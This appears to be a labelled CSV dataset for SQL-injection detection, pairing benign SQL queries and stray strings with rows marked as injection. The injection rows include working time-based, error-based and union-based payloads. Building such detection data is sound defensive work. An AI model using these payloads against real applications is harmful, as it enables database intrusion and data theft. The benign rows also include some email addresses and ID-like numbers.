Sentence,Label
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",1
46844,0
1'  )   as mzby where 6530  =  6530,1
2797490000000000,0
"1'   )    )    and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and    (    (   'pbtf'  =  'pbtf",1
SELECT * FROM prepare WHERE two = 'paper' FETCH FIRST 3 ROWS ONLY,0
1' where 9602  =  9602,1
"   SELECT full,trail,oldest,to,zipper     (  (  suddenly JOIN worried ON mood.slipped =  themselves.problem )   INNER JOIN ourselvesON Orders.moment =  give.shorterID ) ",0
SELECT * FROM suit  WHERE brush = travel,0
"INSERT INTO fill ( flow, mighty, apple, combination, dance, allow )  VALUES  ( 'pile', 'birds'. detail', 'long', 'image', 'particles', 'have' )  ",0
SELECT TOP 3 * FROM airplane SELECT * FROM natural 3SELECT * FROM doing,0
select case when 1892  =  3646 then 1 else null end--,1
li74re04,0
1   )    )    and 9198  =  9198--,1
SELECT TOP 3 * FROM threw WHERE home = 'instant' SELECT * FROM opportunity,0
"1""   )    )     )   or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (     (  ""hxgu""  =  ""hxgu",1
"-7916'   )    )    union all select 9299,9299,9299,9299,9299,9299,9299,9299,9299,9299#",1
1'||  (  select 'wadx' where 4287  =  4287 or sleep  (  5  )  #,1
c/ hermanos pinzon 178,0
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c881b67715' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
SELECT * FROM compound WHERE little = 'itself' FETCH FIRST 3 ROWS ONLY,0
"1  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  4666  =  4666",1
"1',exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  7759  =  7759,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
1\'1,1
"INSERT INTO plan  ( buffalo, particularly, pencil )  VALUES  ( 'danger', 'ready', 'bush' )  ",0
1526,0
mouchet@007tv.fj,0
1' rlike sleep  (  5  )   and 'cugs'  =  'cugs,1
SELECT * FROM wp_posts WHERE ID  =  262335 LIMIT 1,0
"1   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  6556  =  6556",1
"select pg_sleep  (  5  )   and    (    (     (  ""%""  =  """,1
boes@cumbareback.kz,0
severiano,0
"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",1
bergamasco privado,0
SELECT education,0
SELECT * FROM office WHERE four IN  ( SELECT shelter FROM badly ) ,0
valdelinares,0
"  UPDATE tribe SET support =  'wire', City =  'flat' WHERE duty =  him",0
"-5322"" union all select 6494,6494,6494,6494,6494,6494--",1
SELECT COUNT ( term )  FROM scared,0
"1   )    )    as queb where 2449  =  2449 union all select null,null#",1
-6298' or 4724  =  4876,1
SELECT AVG ( lucky ) FROM everyone SELECT SUM ( composition ) ,0
buch als,0
DELETE FROM roof WHERE heat = 'mine',0
SELECT * FROM individual WHERE    NOT post = 'horn',0
pillo,0
SELECT paint,0
"1'||  (  select 'ttyt' where 3751  =  3751 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
DELETE FROM fewer,0
SELECT noise ( s )  FROM south FULL OUTER JOIN,0
" SELECT * FROM quite ORDER BY two, edge",0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",1
SELECT * FROM ago WHERE market BETWEEN '1996-07-01' AND '1996-07-31',0
millares,0
que3h5a,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  '%'  =  '",1
SELECT COUNT ( regular ) FROM clean,0
"-7501'+  (  select uloc where 3089  =  3089 union all select 3089,3089,3089,3089,3089,3089,3089,3089,3089,3089--",1
acachorrar,0
1'   )    )    as zari where 6847  =  6847,1
1   )    )    as wwkw where 7289  =  7289 and 7533  =  7533--,1
1%'   )    )     )   and 7219  =  7361 and    (    (     (  '%'  =  ',1
"1' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and 'esjl'  =  'esjl",1
SELECT real ( s FROM great RIGHT JOIN,0
"-3667%'   )    )    union all select 3560,3560,3560--",1
SELECT new ( s )  FROM bark SELECT what FROM service,0
"1'||  (  select 'wvio' from dual where 8934  =  8934 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
-9739' or 8571  =  8571--,1
select   (  case when   (  8375  =  8318  )   then 8375 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
"1%'   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   '%'  =  '",1
SELECT AVG ( fresh ) FROM milk SELECT SUM ( voice ) ,0
"   SELECT Employees.fun, COUNT ( Orders.ruleID )  AS anyoneFROM    ( OrdersINNER JOIN pot ON Orders.coolID  =  Employees.beautyID ) ",0
"1'   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'gucd'  =  'gucd",1
0 or 1  =  1,1
SELECT * FROM compare WHERE Price NOT BETWEEN 10 AND 20,0
13420,0
cercs,0
SELECT AVG ( musical ) FROM dead SELECT SUM ( road ) ,0
select * from users where id  =  1 + $+%1 or 1  =  1 -- 1,1
" select * from users where id  =  1. union select null,version  (    )   -- 1",1
mamakos@palodegolf.com.rw,0
1'   )    )    as lkse where 9951  =  9951,1
almonacid de la cuba,0
tripicallero,0
38623329g,0
6e1ba,0
SELECT these FROM change,0
47343175k,0
SELECT * FROM hurry WHERE proper = 'below' FETCH FIRST 3 ROWS ONLY,0
5123,0
SELECT MIN ( salt )  AS court FROM parallel,0
-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,1
SELECT AVG ( train ) FROM park,0
min81t8,0
"1%"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
1'   )    )    as hzbj where 1725  =  1725 or sleep  (  5  )  #,1
SELECT * FROM only FETCH FIRST 50 PERCENT ROWS ONLY,0
"-6095""  )   as hygc where 8142  =  8142 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1
SELECT AVG ( base ) FROM note,0
2569,0
09069193v,0
"1%"" and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and ""%""  =  """,1
9600,0
"calle llorente, 73,",0
1 where 2382  =  2382,1
t0na5t44la,0
gustat0v4,0
SELECT * FROM exciting FETCH FIRST 50 PERCENT ROWS ONLY,0
"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
1' where 4473  =  4473 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
-1638' or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'xkne'  =  'xkne,1
"  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   ",1
"1  )   where 7588  =  7588 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  ",1
SELECT * FROM indeed,0
"  SELECT Orders.quicklyrID, Employees.about, Employees.deal FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.stoppedID ORDER BY Orders.divideID",0
SELECT * FROM  ( SELECT garden FROM fair ) ,0
"   SELECT COUNT ( happily ) , lungs FROM else BY name",0
13440,0
3814,0
"INSERT INTO difficult  ( explanation, complete, someone )  VALUES  ( 'nervous', 'wear', 'spite' )  ",0
6991,0
SELECT TOP 3 * FROM doubt WHERE smaller = 'hidden',0
presencio,0
"1'   )    )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'pqxe' like 'pqxe",1
-3597'   )    )    order by 1--,1
chicle,0
"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1""  )   as aifd where 5962  =  5962",1
SELECT * FROM electricity WHERE street NOT BETWEEN 'kitchen' AND 'made',0
"1%'  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"  SELECT TIME_TO_SEC ( ""00:00:05"" ) ;",0
81e9604o6o,0
SELECT two ( s )  FROM toward,0
"1'  )   as ghks where 5128  =  5128 union all select null,null,null,null,null,null,null,null,null,null#",1
"1'  )   where 1646  =  1646 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"1%'   )    )    union all select null,null,null,null,null--",1
arbizu,0
rowen,0
SELECT TOP 3 * FROM nature,0
capella gorrn,0
"1%"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1
"1',  (  select   (  case when   (  1609  =  1609  )   then waitfor delay '0:0:5' else 1609*  (  select 1609 from master..sysdatabases  )   end   )    )   ",1
-4557%'   )    )    or 4537  =  3401 and    (    (   '%'  =  ',1
SELECT * FROM son FETCH FIRST 3 ROWS ONLY,0
freixes navaln,0
-2981   )    )    or   (  8459  =  8459  )  *4906 and    (    (   4202  =  4202,1
"1'||  (  select 'ukfj' where 7133  =  7133 union all select null,null,null#",1
"SELECT * FROM prize WHERE had BETWEEN ""ice"" AND    ""asleep""",0
 or '1'   =   '1,1
SELECT above ( s FROM beauty RIGHT JOIN,0
"1  )   as hlit where 4973  =  4973 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
-6500'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'padu' like 'padu,1
SELECT COUNT ( cuttingID ) FROM way,0
select,1
SELECT TOP 3 * FROM consist WHERE lunch = 'period',0
"-4397'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  'omqt'  =  'omqt",1
SELECT MIN ( handsome )  AS lay FROM mad,0
"-2862'   )    )     )   union all select 6649,6649--",1
"1%' procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"c/ el jacinto, 132,",0
SELECT TOP 3 * FROM chart WHERE can = 'west',0
"1""  )   as bpmk where 6412  =  6412 union all select null,null,null,null#",1
SELECT * FROM such WHERE fear = 'forget' LIMIT 3,0
SELECT * FROM gift WHERE NOT moment = 'apart'  AND NOT which = 'path',0
"1"" where 7739  =  7739 and sleep  (  5  )  --",1
SELECT * FROM proud 3,0
SELECT expect ( s )  FROM value SELECT breakfast FROM entire,0
SELECT * FROM go ORDER BY sharp DESC,0
1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'mptm'  =  'mptm,1
membro,0
"1""  )   rlike sleep  (  5  )  #",1
1'   )    )    as tcby where 5213  =  5213,1
sol,0
SELECT * FROM tears FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM softly,0
SELECT * FROM can  WHERE widely NOT LIKE '[meant]%',0
"1   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )  # ujdg",1
" SELECT * FROM realize ORDER BY friend ASC, ask DESC",0
688,0
"   SELECT Employees.number, COUNT ( Orders.dailyID )  AS incomeFROM    ( OrdersINNER JOIN purple ON Orders.dependID  =  Employees.passageID ) ",0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_4_text' LIMIT 1,0
0e06u8s17,0
" SELECT * FROM lovely ORDER BY practice, ship",0
"1' in boolean mode  )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   #",1
"  SELECT driverID AS ID, string AS year FROM event",0
"1'   )    )    and elt  (  4460  =  2665,2665  )   and    (    (   'qmzu'  =  'qmzu",1
1  )   where 5866  =  5866 and 4595  =  4595#,1
" SELECT column_name ( s )  FROM please,lucky",0
"  SELECT * FROM mean WHERE zipper IN  ( 'herd', 'prove', 'valley' )  ",0
SELECT option_value FROM wp_options WHERE option_name  =  '_options_footer_button_3_text' LIMIT 1,0
"  SELECT speedID AS ID, win AS proper FROM add",0
1972,0
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",1
SELECT * FROM goose WHERE chamber BETWEEN am09/01/1996fight AND active15/31/1996boat,0
SELECT * FROM slowly,0
SELECT AVG ( coffee ) FROM club,0
"-5300' union all select 2750,2750,2750,2750,2750,2750--",1
desmedro,0
edmunds.emil@carimartin.io,0
SELECT * FROM snow WHERE search BETWEEN party09/01/1996stop AND hidden15/31/1996ourselves,0
"waitfor delay '0:0:5' and   (  ""dmcu""  =  ""dmcu",1
1'   )    )     )   and   (  8982  =  8027  )  *8027 and    (    (     (  'qkrv'  =  'qkrv,1
1'   )    )    and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,1
FROM  ( SELECT DISTINCT band FROM page ) ,0
"1""   )    )    as sgln where 7573  =  7573",1
"-4934"" union all select 5119,5119,5119,5119,5119--",1
SELECT foot FROM uncle UNION SELECT given FROM tales ORDER BY out,0
"   SELECT trap,chosen,eventually,journey,job     (  (  build JOIN grandmother ON satisfied.salt =  studied.eventually )   INNER JOIN perfectON Orders.coast =  whom.gentleID ) ",0
SELECT * FROM team WHERE subject = 'unknown',0
arganza,0
"1   )    )     )   union all select null,null,null,null,null,null,null,null,null,null--",1
"-9688%'   )    )     )   or elt  (  3695  =  7995,7995  )   and    (    (     (  '%'  =  '",1
" select * from users where id  =  '1' or @ 1  =  1 union select 1,version  (    )   -- 1'",1
SELECT COUNT ( favorite )  FROM thirty,0
7840,0
SELECT TOP 3 * FROM buried SELECT * FROM waste 3SELECT * FROM railroad,0
"  SELECT will,suit,green FROM damage LEFT JOIN Orders ON rod.pineID =  outer.ask ORDER BY pipe.brought",0
SELECT * FROM wp_posts WHERE ID  =  347686 LIMIT 1,0
SELECT apple ( s )  FROM rice UNION,0
"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'lwlh'  =  'lwlh",1
SELECT member ( s )  FROM mood SELECT clothing ( s ) ,0
SELECT TOP 3 * FROM crew,0
m7124v3,0
" or 1  =  1 or """"  =  ",1
"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,1
7686270000000000,0
8417339999999999,0
1' in boolean mode  )   and sleep  (  5  )  #,1
"  SELECT   COALESCE ( NULL, 1, 2, 'W3Schools.com' ) ;",0
"1%""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""%""  =  """,1
SELECT * FROM winter,0
SELECT MIN ( low )  AS plate FROM teeth,0
DELETE FROM mile,0
"1'||  (  select 'neqi' where 6873  =  6873 union all select null,null,null,null,null,null,null--",1
select   (  case when   (  7822  =  4430  )   then 7822 else 1/  (  select 0  )   end  )  --,1
grodecki,0
gunderso,0
SELECT * FROM bend WHERE wait = 'anything'  OR cage = 'list',0
jaca 75,0
zulmara,0
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",1
"1'  )   where 6720  =  6720 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
82818101t,0
gaile,0
nicforo,0
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   ""sfnj"" like ""sfnj",1
SELECT straight FROM locate UNION SELECT grow FROM drop ORDER BY house,0
SELECT * FROM boat WHERE service = 'chart'  AND  ( yourself = 'rapidly' OR wide = 'shout' ) ,0
metcalfe,0
SELECT * FROM idea WHERE NOT hole = 'who'  AND NOT movement = 'author',0
1'  )   as dpmh where 5281  =  5281 and 2006  =  2006,1
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1
-1796'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  'lpuw' like 'lpuw,1
or a  =  a--,1
"INSERT INTO town  ( continued, order, would )  VALUES  ( 'sell', 'cake', 'industrial' )  ",0
"-6335""   )    )     )   union all select 3654--",1
puntagorda,0
DELETE FROM ear WHERE ran = 'ball',0
"select sleep  (  5  )   and    (    (     (  ""%""  =  """,1
SELECT * FROM coal ORDER BY beside DESC,0
"  SELECT * FROM replace WHERE subject IN  ( 'managed', 'past', 'name' )  ",0
SELECT * FROM anywhere WHERE am = 'everything'  OR bigger = 'dropped',0
c/ costa i llobera 83,0
FROM  ( SELECT DISTINCT save FROM chose ) ,0
